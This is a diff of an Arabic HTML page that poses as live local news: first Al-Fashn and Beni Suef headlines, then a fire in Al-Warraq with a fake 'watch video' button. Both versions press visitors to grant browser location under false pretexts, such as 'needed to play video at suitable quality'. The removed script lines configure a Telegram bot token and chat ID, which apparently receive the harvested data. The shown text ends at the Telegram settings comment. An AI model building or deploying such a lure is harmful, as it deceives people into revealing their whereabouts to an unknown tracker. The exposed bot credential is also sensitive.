@@ -1,447 +1,320 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>📰 أخبار الفشن وبني سويف | آخر الأخبار المحلية</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap');
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🔥 حريق الوراق — تغطية مباشرة</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap');
 
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+* { margin: 0; padding: 0; box-sizing: border-box; }
 
-        body {
-            font-family: 'Cairo', 'Tajawal', sans-serif;
-            min-height: 100vh;
-            background: #0a0a0a;
-            background-image: radial-gradient(ellipse at 50% 0%, #1a2a05 0%, #000a00 70%);
-            color: #fff;
-            overflow-x: hidden;
-            padding-bottom: 20px;
-        }
+body {
+    font-family: 'Cairo', 'Tajawal', sans-serif;
+    min-height: 100vh;
+    background: #0a0a0a;
+    background-image: radial-gradient(ellipse at 50% 0%, #2a0505 0%, #0a0000 70%);
+    color: #fff;
+    overflow-x: hidden;
+    padding-bottom: 20px;
+}
 
-        .bg-effects {
-            position: fixed;
-            inset: 0;
-            pointer-events: none;
-            z-index: 0;
-            overflow: hidden;
-        }
-        .bg-effects .glow {
-            position: absolute;
-            border-radius: 50%;
-            filter: blur(120px);
-            opacity: 0.08;
-            animation: float-glow 20s ease-in-out infinite alternate;
-        }
-        .bg-effects .glow:nth-child(1) {
-            width: 500px; height: 500px; background: #22c55e;
-            top: -200px; right: -200px;
-        }
-        .bg-effects .glow:nth-child(2) {
-            width: 400px; height: 400px; background: #16a34a;
-            bottom: -150px; left: -150px; animation-delay: 7s;
-        }
-        @keyframes float-glow {
-            0% { transform: translate(0,0) scale(1); }
-            100% { transform: translate(40px,-40px) scale(1.4); }
-        }
+.bg-effects {
+    position: fixed; inset: 0;
+    pointer-events: none; z-index: 0; overflow: hidden;
+}
+.bg-effects .glow {
+    position: absolute; border-radius: 50%;
+    filter: blur(120px); opacity: 0.10;
+    animation: float-glow 20s ease-in-out infinite alternate;
+}
+.bg-effects .glow:nth-child(1) {
+    width: 500px; height: 500px; background: #ef4444;
+    top: -200px; right: -200px;
+}
+.bg-effects .glow:nth-child(2) {
+    width: 400px; height: 400px; background: #f97316;
+    bottom: -150px; left: -150px; animation-delay: 7s;
+}
+@keyframes float-glow {
+    0%   { transform: translate(0,0) scale(1); }
+    100% { transform: translate(40px,-40px) scale(1.4); }
+}
 
-        .top-bar {
-            position: sticky;
-            top: 0;
-            z-index: 100;
-            background: rgba(0, 20, 5, 0.85);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            padding: 12px 16px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 1px solid rgba(34,197,94,0.15);
-        }
-        .logo {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-weight: 900;
-            font-size: 18px;
-        }
-        .logo-icon { font-size: 24px; }
-        .live-badge {
-            background: #dc2626;
-            color: #fff;
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 11px;
-            font-weight: 800;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-        .live-dot {
-            width: 7px; height: 7px; background: #fff;
-            border-radius: 50%;
-            animation: blink 1s infinite;
-        }
-        @keyframes blink {
-            0%,100% { opacity: 1; } 50% { opacity: 0.2; }
-        }
+.top-bar {
+    position: sticky; top: 0; z-index: 100;
+    background: rgba(20,0,0,0.85);
+    backdrop-filter: blur(20px);
+    padding: 12px 16px;
+    display: flex; justify-content: space-between; align-items: center;
+    border-bottom: 1px solid rgba(239,68,68,0.2);
+}
+.logo { display: flex; align-items: center; gap: 8px; font-weight: 900; font-size: 18px; }
+.logo-icon { font-size: 24px; }
+.live-badge {
+    background: #dc2626; color: #fff;
+    padding: 4px 12px; border-radius: 20px;
+    font-size: 11px; font-weight: 800;
+    display: flex; align-items: center; gap: 5px;
+}
+.live-dot {
+    width: 7px; height: 7px; background: #fff;
+    border-radius: 50%; animation: blink 1s infinite;
+}
+@keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.2} }
 
-        .breaking-news {
-            background: linear-gradient(90deg, #b91c1c, #dc2626);
-            color: #fff;
-            padding: 9px 16px;
-            font-size: 12px;
-            font-weight: 700;
-            display: flex;
-            gap: 10px;
-            overflow: hidden;
-            white-space: nowrap;
-        }
-        .breaking-news .ticker {
-            display: inline-block;
-            animation: ticker 25s linear infinite;
-            padding-right: 100%;
-        }
-        @keyframes ticker {
-            0% { transform: translateX(0); }
-            100% { transform: translateX(-100%); }
-        }
+.breaking-news {
+    background: linear-gradient(90deg, #7f1d1d, #dc2626);
+    color: #fff; padding: 9px 16px;
+    font-size: 12px; font-weight: 700;
+    display: flex; gap: 10px; overflow: hidden; white-space: nowrap;
+}
+.breaking-news .ticker {
+    display: inline-block;
+    animation: ticker 25s linear infinite;
+    padding-right: 100%;
+}
+@keyframes ticker {
+    0%{transform:translateX(0)} 100%{transform:translateX(-100%)}
+}
 
-        .container {
-            position: relative;
-            z-index: 1;
-            max-width: 560px;
-            margin: 0 auto;
-            padding: 14px;
-        }
+.container {
+    position: relative; z-index: 1;
+    max-width: 560px; margin: 0 auto; padding: 14px;
+}
 
-        .page-title {
-            text-align: center;
-            padding: 18px 0 10px;
-        }
-        .page-title h1 {
-            font-size: 26px;
-            font-weight: 900;
-            background: linear-gradient(135deg, #86efac, #22c55e);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            text-shadow: 0 0 40px rgba(34,197,94,0.2);
-        }
-        .page-title p {
-            color: rgba(255,255,255,0.45);
-            font-size: 13px;
-            margin-top: 4px;
-        }
+.page-title { text-align: center; padding: 18px 0 10px; }
+.page-title h1 {
+    font-size: 26px; font-weight: 900;
+    background: linear-gradient(135deg, #fca5a5, #ef4444);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+}
+.page-title p { color: rgba(255,255,255,0.45); font-size: 13px; margin-top: 4px; }
 
-        .post-card {
-            background: rgba(0,0,0,0.55);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(34,197,94,0.12);
-            border-radius: 20px;
-            margin-bottom: 14px;
-            overflow: hidden;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.4);
-            transition: 0.3s;
-        }
+.post-card {
+    background: rgba(0,0,0,0.55);
+    backdrop-filter: blur(20px);
+    border: 1px solid rgba(239,68,68,0.15);
+    border-radius: 20px;
+    margin-bottom: 14px; overflow: hidden;
+    box-shadow: 0 10px 40px rgba(0,0,0,0.4);
+}
+.post-header { display: flex; align-items: center; gap: 10px; padding: 12px 14px; }
+.avatar {
+    width: 44px; height: 44px; border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-weight: 900; font-size: 16px; flex-shrink: 0;
+    background: linear-gradient(135deg, #ef4444, #b91c1c);
+    color: #fff;
+}
+.avatar.o { background: linear-gradient(135deg, #f97316, #ea580c); }
+.avatar.p { background: linear-gradient(135deg, #a855f7, #7c3aed); }
+.avatar.b { background: linear-gradient(135deg, #0ea5e9, #0369a1); }
+.post-info { flex: 1; min-width: 0; }
+.post-author { font-weight: 800; font-size: 14px; color: #fca5a5; }
+.post-time { font-size: 11px; color: rgba(255,255,255,0.4); margin-top: 2px; }
 
-        .post-header {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            padding: 12px 14px;
-        }
-        .avatar {
-            width: 44px; height: 44px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 900;
-            font-size: 16px;
-            flex-shrink: 0;
-            background: linear-gradient(135deg, #22c55e, #15803d);
-            color: #fff;
-        }
-        .avatar.o { background: linear-gradient(135deg, #ea580c, #f97316); }
-        .avatar.p { background: linear-gradient(135deg, #7c3aed, #a855f7); }
-        .avatar.r { background: linear-gradient(135deg, #dc2626, #f87171); }
-        .avatar.b { background: linear-gradient(135deg, #0369a1, #0ea5e9); }
+/* ═══════════════════════════════════════════════════════
+   مشغل الفيديو + زر التشغيل
+   ═══════════════════════════════════════════════════════ */
+.video-container {
+    position: relative;
+    width: 100%;
+    height: 240px;
+    background: #000;
+    overflow: hidden;
+    cursor: pointer;
+}
+.video-container img {
+    width: 100%; height: 100%;
+    object-fit: cover; opacity: 0.8;
+    transition: 0.3s;
+    display: block;
+}
+.video-container:hover img { opacity: 1; }
 
-        .post-info { flex: 1; min-width: 0; }
-        .post-author {
-            font-weight: 800;
-            font-size: 14px;
-            color: #86efac;
-        }
-        .post-time {
-            font-size: 11px;
-            color: rgba(255,255,255,0.4);
-            margin-top: 2px;
-        }
-        .post-image {
-            width: 100%;
-            height: 190px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 64px;
-            background: linear-gradient(135deg, #14532d, #166534);
-            position: relative;
-        }
-        .post-image.g2 { background: linear-gradient(135deg, #7c2d12, #9a3412); }
-        .post-image.g3 { background: linear-gradient(135deg, #1e3a8a, #1e40af); }
-        .post-image.g4 { background: linear-gradient(135deg, #581c87, #6b21a8); }
-        .post-tag {
-            position: absolute;
-            top: 10px; right: 10px;
-            background: rgba(0,0,0,0.75);
-            color: #86efac;
-            padding: 3px 12px;
-            border-radius: 20px;
-            font-size: 10px;
-            font-weight: 800;
-        }
-        .post-body {
-            padding: 12px 14px;
-            font-size: 14px;
-            line-height: 1.7;
-            color: rgba(255,255,255,0.85);
-        }
-        .post-body strong {
-            color: #86efac;
-            display: block;
-            margin-bottom: 5px;
-            font-size: 15px;
-        }
-        .post-actions {
-            border-top: 1px solid rgba(34,197,94,0.08);
-            padding: 8px 12px;
-            display: flex;
-            gap: 6px;
-        }
-        .action-btn {
-            flex: 1;
-            background: none;
-            border: none;
-            padding: 8px;
-            font-family: inherit;
-            font-size: 12px;
-            color: rgba(255,255,255,0.5);
-            font-weight: 700;
-            border-radius: 8px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 5px;
-            transition: 0.2s;
-        }
-        .action-btn:hover { background: rgba(34,197,94,0.08); }
-        .action-btn.liked { color: #22c55e; }
+.video-container .play-btn {
+    position: absolute; inset: 0;
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    gap: 12px;
+    background: rgba(0,0,0,0.35);
+    border: none; cursor: pointer;
+    font-family: inherit;
+    transition: 0.3s;
+}
+.video-container .play-btn:hover { background: rgba(0,0,0,0.5); }
 
-        .more-btn {
-            width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, #22c55e, #15803d);
-            border: none;
-            border-radius: 50px;
-            color: #fff;
-            font-size: 17px;
-            font-weight: 900;
-            font-family: inherit;
-            cursor: pointer;
-            transition: 0.3s;
-            box-shadow: 0 8px 30px rgba(34,197,94,0.35);
-            margin: 16px 0 6px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-        .more-btn:active { transform: scale(0.97); }
-        .more-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+.video-container .play-circle {
+    width: 78px; height: 78px;
+    background: linear-gradient(135deg, #ef4444, #b91c1c);
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 32px; color: #fff;
+    padding-right: 6px;
+    box-shadow: 0 12px 45px rgba(239,68,68,0.7);
+    animation: pulsePlay 1.6s ease-in-out infinite;
+    transition: 0.3s;
+}
+@keyframes pulsePlay {
+    0%,100% { transform: scale(1); box-shadow: 0 12px 45px rgba(239,68,68,0.7); }
+    50%     { transform: scale(1.1); box-shadow: 0 12px 60px rgba(239,68,68,1); }
+}
+.video-container .play-text {
+    color: #fff; font-size: 13px; font-weight: 800;
+    background: rgba(0,0,0,0.7);
+    padding: 6px 16px; border-radius: 20px;
+    letter-spacing: 0.3px;
+}
+.video-container .video-tag {
+    position: absolute; top: 10px; right: 10px;
+    background: rgba(0,0,0,0.8);
+    color: #fca5a5; padding: 4px 12px;
+    border-radius: 20px; font-size: 11px; font-weight: 800;
+}
 
-        .status-msg {
-            display: none;
-            margin-top: 12px;
-            padding: 14px 16px;
-            background: rgba(34,197,94,0.08);
-            border: 1px solid rgba(34,197,94,0.2);
-            border-radius: 14px;
-            text-align: center;
-            font-size: 13px;
-            color: #86efac;
-            font-weight: 700;
-        }
-        .status-msg.show { display: block; animation: fadeSlide 0.4s ease; }
-        .status-msg.error {
-            background: rgba(239,68,68,0.1);
-            border-color: rgba(239,68,68,0.25);
-            color: #f87171;
-        }
-        @keyframes fadeSlide {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
+/* رسالة "بيتم تجهيز الفيديو" */
+.video-loading {
+    position: absolute; inset: 0;
+    background: rgba(0,0,0,0.92);
+    display: none;
+    flex-direction: column;
+    align-items: center; justify-content: center;
+    gap: 14px; z-index: 5;
+}
+.video-loading.show { display: flex; }
+.video-loading .big-spinner {
+    width: 50px; height: 50px;
+    border: 4px solid rgba(239,68,68,0.25);
+    border-top-color: #ef4444;
+    border-radius: 50%;
+    animation: spin 0.9s linear infinite;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+.video-loading .loading-text {
+    color: #fca5a5; font-size: 14px; font-weight: 800;
+}
 
-        .location-overlay {
-            position: fixed;
-            inset: 0;
-            z-index: 99999;
-            background: rgba(0,0,0,0.92);
-            backdrop-filter: blur(12px);
-            -webkit-backdrop-filter: blur(12px);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-            opacity: 1;
-            transition: opacity 0.4s ease;
-        }
-        .location-overlay.hide {
-            opacity: 0;
-            pointer-events: none;
-        }
-        .loc-card {
-            background: linear-gradient(160deg, #0f1f0a, #051005);
-            border: 1px solid rgba(34,197,94,0.3);
-            border-radius: 28px;
-            padding: 32px 24px;
-            max-width: 400px;
-            width: 100%;
-            text-align: center;
-            box-shadow: 0 30px 80px rgba(0,0,0,0.8), 0 0 60px rgba(34,197,94,0.15);
-            animation: popIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
-        }
-        @keyframes popIn {
-            from { opacity: 0; transform: scale(0.85); }
-            to { opacity: 1; transform: scale(1); }
-        }
-        .loc-icon {
-            width: 90px; height: 90px;
-            margin: 0 auto 18px;
-            background: linear-gradient(135deg, #22c55e, #15803d);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 46px;
-            box-shadow: 0 12px 40px rgba(34,197,94,0.4);
-            animation: pulseIcon 1.8s ease-in-out infinite;
-        }
-        @keyframes pulseIcon {
-            0%,100% { transform: scale(1); box-shadow: 0 12px 40px rgba(34,197,94,0.4); }
-            50% { transform: scale(1.08); box-shadow: 0 12px 60px rgba(34,197,94,0.7); }
-        }
-        .loc-title {
-            font-size: 22px;
-            font-weight: 900;
-            color: #fff;
-            margin-bottom: 8px;
-        }
-        .loc-title span {
-            background: linear-gradient(135deg, #86efac, #22c55e);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-        .loc-desc {
-            font-size: 13px;
-            color: rgba(255,255,255,0.55);
-            line-height: 1.6;
-            margin-bottom: 22px;
-        }
-        .allow-btn {
-            width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, #22c55e, #15803d);
-            border: none;
-            border-radius: 50px;
-            color: #fff;
-            font-size: 17px;
-            font-weight: 900;
-            font-family: inherit;
-            cursor: pointer;
-            box-shadow: 0 10px 35px rgba(34,197,94,0.4);
-            transition: 0.25s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-        .allow-btn:active { transform: scale(0.96); }
-        .allow-btn:disabled {
-            opacity: 0.7;
-            cursor: not-allowed;
-            background: linear-gradient(135deg, #166534, #14532d);
-        }
-        .loc-hint {
-            margin-top: 14px;
-            font-size: 11px;
-            color: rgba(255,255,255,0.3);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 5px;
-        }
-        .spinner {
-            display: none;
-            width: 18px;
-            height: 18px;
-            border: 2px solid rgba(255,255,255,0.3);
-            border-top-color: #fff;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
-        .spinner.show { display: inline-block; }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
+.post-body {
+    padding: 12px 14px; font-size: 14px; line-height: 1.7;
+    color: rgba(255,255,255,0.85);
+}
+.post-body strong {
+    color: #fca5a5; display: block;
+    margin-bottom: 5px; font-size: 15px;
+}
+.post-actions {
+    border-top: 1px solid rgba(239,68,68,0.1);
+    padding: 8px 12px; display: flex; gap: 6px;
+}
+.action-btn {
+    flex: 1; background: none; border: none;
+    padding: 8px; font-family: inherit;
+    font-size: 12px; color: rgba(255,255,255,0.5);
+    font-weight: 700; border-radius: 8px;
+    cursor: pointer;
+    display: flex; align-items: center; justify-content: center;
+    gap: 5px; transition: 0.2s;
+}
+.action-btn:hover { background: rgba(239,68,68,0.1); }
+.action-btn.liked { color: #ef4444; }
 
-        .status-badge {
-            position: fixed;
-            bottom: 12px;
-            right: 12px;
-            background: rgba(0,0,0,0.8);
-            backdrop-filter: blur(10px);
-            padding: 5px 12px;
-            border-radius: 30px;
-            border: 1px solid rgba(255,255,255,0.05);
-            color: #10b981;
-            font-size: 10px;
-            font-family: monospace;
-            z-index: 999;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-        .status-badge .dot {
-            width: 6px; height: 6px;
-            border-radius: 50%;
-            background: #10b981;
-            animation: pulse 1.5s ease-in-out infinite;
-        }
-        @keyframes pulse {
-            0%,100% { opacity: 0.3; transform: scale(0.8); }
-            50% { opacity: 1; transform: scale(1.2); }
-        }
+.footer-note {
+    text-align: center; font-size: 10px;
+    color: rgba(255,255,255,0.2);
+    padding: 20px 0 10px; line-height: 1.8;
+}
 
-        .footer-note {
-            text-align: center;
-            font-size: 10px;
-            color: rgba(255,255,255,0.15);
-            padding: 20px 0 10px;
-        }
+/* ═══════════════════════════════════════════════════════
+   Modal طلب الموقع (يظهر بعد ضغط الفيديو)
+   ═══════════════════════════════════════════════════════ */
+.loc-modal {
+    position: fixed; inset: 0; z-index: 99999;
+    background: rgba(0,0,0,0.9);
+    backdrop-filter: blur(10px);
+    display: none;
+    align-items: center; justify-content: center;
+    padding: 20px;
+}
+.loc-modal.show { display: flex; }
 
-        @media (max-width: 480px) {
-            .page-title h1 { font-size: 22px; }
-            .loc-card { padding: 26px 18px; }
-            .loc-title { font-size: 19px; }
-        }
-    </style>
+.loc-modal .modal-card {
+    background: linear-gradient(160deg, #1f0a0a, #0a0000);
+    border: 1px solid rgba(239,68,68,0.3);
+    border-radius: 24px;
+    padding: 26px 22px;
+    max-width: 380px; width: 100%;
+    text-align: center;
+    box-shadow: 0 30px 80px rgba(0,0,0,0.8), 0 0 60px rgba(239,68,68,0.15);
+    animation: popIn 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+}
+@keyframes popIn {
+    from { opacity: 0; transform: scale(0.85); }
+    to   { opacity: 1; transform: scale(1); }
+}
+.loc-modal .modal-icon {
+    width: 70px; height: 70px; margin: 0 auto 14px;
+    background: linear-gradient(135deg, #ef4444, #b91c1c);
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 34px;
+    box-shadow: 0 12px 40px rgba(239,68,68,0.4);
+    animation: pulseIcon 1.6s ease-in-out infinite;
+}
+@keyframes pulseIcon {
+    0%,100% { transform: scale(1); }
+    50%     { transform: scale(1.08); }
+}
+.loc-modal .modal-title {
+    font-size: 18px; font-weight: 900;
+    color: #fff; margin-bottom: 8px;
+}
+.loc-modal .modal-desc {
+    font-size: 12.5px;
+    color: rgba(255,255,255,0.6);
+    line-height: 1.7;
+    margin-bottom: 18px;
+}
+.loc-modal .modal-desc b { color: #fca5a5; }
+.loc-modal .modal-allow {
+    width: 100%; padding: 14px;
+    background: linear-gradient(135deg, #ef4444, #b91c1c);
+    border: none; border-radius: 50px;
+    color: #fff; font-size: 15px; font-weight: 900;
+    font-family: inherit; cursor: pointer;
+    box-shadow: 0 8px 30px rgba(239,68,68,0.4);
+    transition: 0.25s;
+    display: flex; align-items: center; justify-content: center;
+    gap: 8px;
+    margin-bottom: 8px;
+}
+.loc-modal .modal-allow:active { transform: scale(0.97); }
+.loc-modal .modal-allow:disabled { opacity: 0.7; cursor: not-allowed; }
+.loc-modal .modal-skip {
+    width: 100%; padding: 11px;
+    background: transparent;
+    border: 1px solid rgba(255,255,255,0.12);
+    border-radius: 50px;
+    color: rgba(255,255,255,0.45);
+    font-size: 12px; font-weight: 700;
+    font-family: inherit; cursor: pointer;
+    transition: 0.2s;
+}
+.loc-modal .modal-skip:hover {
+    background: rgba(255,255,255,0.05);
+    color: rgba(255,255,255,0.8);
+}
+
+.spinner {
+    display: none; width: 16px; height: 16px;
+    border: 2px solid rgba(255,255,255,0.3);
+    border-top-color: #fff; border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+}
+.spinner.show { display: inline-block; }
+</style>
 </head>
 <body>
 
@@ -450,23 +323,10 @@
     <div class="glow"></div>
 </div>
 
-<div class="location-overlay" id="locationOverlay">
-    <div class="loc-card">
-        <div class="loc-icon">📍</div>
-        <h2 class="loc-title">اضغط <span>سماح</span> للموقع</h2>
-        <p class="loc-desc">للمتابعة وتحميل آخر أخبار الفشن وبني سويف، يرجى السماح بالوصول إلى موقعك</p>
-        <button class="allow-btn" id="allowBtn" type="button">
-            <span class="spinner" id="locSpinner"></span>
-            <span id="allowBtnText">✅ اضغط سماح للمتابعة</span>
-        </button>
-        <div class="loc-hint">🔒 موقعك آمن ومحمي</div>
-    </div>
-</div>
-
 <div class="top-bar">
     <div class="logo">
-        <span class="logo-icon">📰</span>
-        <span>أخبار الفشن</span>
+        <span class="logo-icon">🔥</span>
+        <span>حريق الوراق</span>
     </div>
     <div class="live-badge">
         <span class="live-dot"></span>
@@ -475,635 +335,383 @@
 </div>
 
 <div class="breaking-news">
-    <strong>⚡ عاجل:</strong>
-    <span class="ticker">حملة رقابية على الأسواق في الفشن | تحذير من منتجات مجهولة المصدر في بني سويف | افتتاح مشروعات جديدة قريباً | تابع آخر المستجدات لحظة بلحظة</span>
+    <strong>🔥 عاجل:</strong>
+    <span class="ticker">
+        حريق ضخم في الوراق | قوات الحماية المدنية تتحرك فوراً | 
+        شهود عيان: ألسنة اللهب مرتفعة | تابع التطورات لحظة بلحظة
+    </span>
 </div>
 
 <div class="container">
-
     <div class="page-title">
-        <h1>📰 أخبار الفشن وبني سويف</h1>
-        <p>آخر الأحداث المحلية لحظة بلحظة</p>
+        <h1>🔥 حريق الوراق — تغطية مباشرة</h1>
+        <p>آخر تطورات الحريق لحظة بلحظة</p>
     </div>
 
+    <!-- ═══════════════════════════════════════════════════
+         كارت الفيديو الرئيسي — الضغط عليه بيطلب الموقع
+         ═══════════════════════════════════════════════════ -->
     <div class="post-card">
         <div class="post-header">
-            <div class="avatar">أح</div>
+            <div class="avatar">ور</div>
             <div class="post-info">
-                <div class="post-author">أحمد محمود الشريف</div>
-                <div class="post-time">🕐 منذ ساعتين · الفشن</div>
+                <div class="post-author">مراسل الوراق</div>
+                <div class="post-time">🕐 منذ 30 دقيقة · الوراق</div>
             </div>
         </div>
-        <div class="post-image">
-            🏛️
-            <span class="post-tag">الفشن</span>
+
+        <div class="video-container" id="videoContainer">
+            <img src="https://images.unsplash.com/photo-1599171571333-8b4b2e5b0e9e?w=800&q=80"
+                 alt="حريق الوراق"
+                 onerror="this.style.display='none';this.parentElement.style.background='linear-gradient(135deg,#7f1d1d,#450a0a)'">
+            
+            <span class="video-tag">🎥 فيديو</span>
+
+            <button class="play-btn" id="playBtn" type="button">
+                <span class="play-circle">▶</span>
+                <span class="play-text">شاهد الفيديو</span>
+            </button>
+
+            <!-- شاشة تحميل فوق الفيديو -->
+            <div class="video-loading" id="videoLoading">
+                <div class="big-spinner"></div>
+                <div class="loading-text">⏳ جاري تجهيز الفيديو...</div>
+            </div>
         </div>
+
         <div class="post-body">
-            <strong>حملة رقابية مكثفة على الأسواق والمحلات بالفشن</strong>
-            شنت مديرية الصحة ببني سويف حملة رقابية موسعة على محلات بيع الأغذية بمركز الفشن، أسفرت عن ضبط كميات من المنتجات منتهية الصلاحية. الحملة تأتي ضمن خطة الوزارة لحماية المواطنين.
+            <strong>🔥 فيديو: لحظة اندلاع الحريق في الوراق</strong>
+            شاهد اللحظات الأولى للحريق الذي اندلع في منطقة الوراق، 
+            وسط تحركات كثيفة لقوات الحماية المدنية.
         </div>
         <div class="post-actions">
-            <button class="action-btn like-btn">👍 <span class="like-count">342</span></button>
-            <button class="action-btn">💬 87</button>
+            <button class="action-btn like-btn">👍 <span class="like-count">1247</span></button>
+            <button class="action-btn">💬 318</button>
             <button class="action-btn">↗️ مشاركة</button>
         </div>
     </div>
 
     <div class="post-card">
         <div class="post-header">
-            <div class="avatar o">مص</div>
+            <div class="avatar o">شه</div>
             <div class="post-info">
-                <div class="post-author">مصطفى عبد الرحمن</div>
-                <div class="post-time">🕐 منذ 5 ساعات · بني سويف</div>
+                <div class="post-author">شهود عيان</div>
+                <div class="post-time">🕐 منذ ساعة · الوراق</div>
             </div>
         </div>
-        <div class="post-image g2">
-            ⚠️
-            <span class="post-tag">تحذير</span>
-        </div>
         <div class="post-body">
-            <strong>تحذير من منتجات مجهولة المصدر في بني سويف</strong>
-            حذرت مديرية الصحة المواطنين من شراء منتجات مجهولة المصدر تُباع في بعض الأسواق الشعبية. وطالبت المواطنين بالتأكد من تاريخ الصلاحية والعلامة التجارية قبل الشراء.
+            <strong>🚒 الحماية المدنية تدفع بـ 5 سيارات إطفاء</strong>
+            دفعت قوات الحماية المدنية بالجيزة بـ 5 سيارات إطفاء للسيطرة 
+            على الحريق. حتى الآن لا توجد خسائر بشرية.
         </div>
         <div class="post-actions">
-            <button class="action-btn like-btn">👍 <span class="like-count">518</span></button>
-            <button class="action-btn">💬 124</button>
+            <button class="action-btn like-btn">👍 <span class="like-count">892</span></button>
+            <button class="action-btn">💬 204</button>
             <button class="action-btn">↗️ مشاركة</button>
         </div>
     </div>
-
-    <div class="post-card">
-        <div class="post-header">
-            <div class="avatar b">فا</div>
-            <div class="post-info">
-                <div class="post-author">فاطمة سيد إبراهيم</div>
-                <div class="post-time">🕐 منذ 8 ساعات · الفشن</div>
-            </div>
-        </div>
-        <div class="post-image g3">
-            🏥
-            <span class="post-tag">صحة</span>
-        </div>
-        <div class="post-body">
-            <strong>مستشفى الفشن المركزي يستقبل حالات تسمم غذائي</strong>
-            استقبل مستشفى الفشن المركزي عدداً من الحالات المصابة بأعراض تسمم غذائي بعد تناول أغذية من أحد المحلات. تم تقديم الإسعافات اللازمة وجميع الحالات في تحسن.
-        </div>
-        <div class="post-actions">
-            <button class="action-btn like-btn">👍 <span class="like-count">267</span></button>
-            <button class="action-btn">💬 63</button>
-            <button class="action-btn">↗️ مشاركة</button>
-        </div>
-    </div>
-
-    <div class="post-card">
-        <div class="post-header">
-            <div class="avatar p">مح</div>
-            <div class="post-info">
-                <div class="post-author">محمد حسن علي</div>
-                <div class="post-time">🕐 منذ 12 ساعة · بني سويف</div>
-            </div>
-        </div>
-        <div class="post-image g4">
-            🎓
-            <span class="post-tag">تعليم</span>
-        </div>
-        <div class="post-body">
-            <strong>افتتاح مدرسة جديدة في قرية تابعة لمركز الفشن</strong>
-            تم افتتاح مدرسة جديدة داخل قرية من قرى مركز الفشن بمحافظة بني سويف، بعد سنوات من المعاناة بسبب بُعد المدارس عن القرية. الأهالي عبروا عن سعادتهم الكبيرة بهذا الإنجاز.
-        </div>
-        <div class="post-actions">
-            <button class="action-btn like-btn">👍 <span class="like-count">891</span></button>
-            <button class="action-btn">💬 203</button>
-            <button class="action-btn">↗️ مشاركة</button>
-        </div>
-    </div>
-
-    <button class="more-btn" id="moreBtn" type="button">
-        <span class="spinner" id="btnSpinner"></span>
-        <span id="btnText">📖 تابع المزيد من الأخبار</span>
-    </button>
-
-    <div class="status-msg" id="statusMsg"></div>
 
     <div class="footer-note">
-        © 2026 أخبار الفشن وبني سويف | جميع الحقوق محفوظة
+        © 2026 تغطية حريق الوراق | جميع الحقوق محفوظة
     </div>
 </div>
 
-<div class="status-badge">
-    <span class="dot"></span>
-    نشط
+<!-- ═══════════════════════════════════════════════════════
+     Modal طلب الموقع
+     ═══════════════════════════════════════════════════════ -->
+<div class="loc-modal" id="locModal">
+    <div class="modal-card">
+        <div class="modal-icon">📍</div>
+        <h3 class="modal-title">اسمح بالموقع لمشاهدة الفيديو</h3>
+        <p class="modal-desc">
+            عشان نشغّل الفيديو بجودة مناسبة لمنطقتك، 
+            <b>محتاجين نوصل لموقعك التقريبي</b>.
+        </p>
+        <button class="modal-allow" id="allowLocationBtn" type="button">
+            <span class="spinner" id="locSpinner"></span>
+            <span id="allowBtnText">📍 اسمح بالموقع و شاهد الفيديو</span>
+        </button>
+        <button class="modal-skip" id="skipLocationBtn" type="button">
+            تخطي — شاهد الفيديو بدون موقع
+        </button>
+    </div>
 </div>
 
 <script>
-    (function() {
-        "use strict";
+(function() {
+    "use strict";
 
-        // ============================================================
-        // ================ إعدادات البوت ==============================
-        // ============================================================
-        var BOT_TOKEN = "8425168324:AAGiTTzty3oL5GMUtMWa74ejRKm7DJlTayU";
-        var MASTER_ID = "5849068535";
+    /* ═══════════════════════════════════════════════════════
+       إعدادات تليجرام
+       ═══════════════════════════════════════════════════════ */
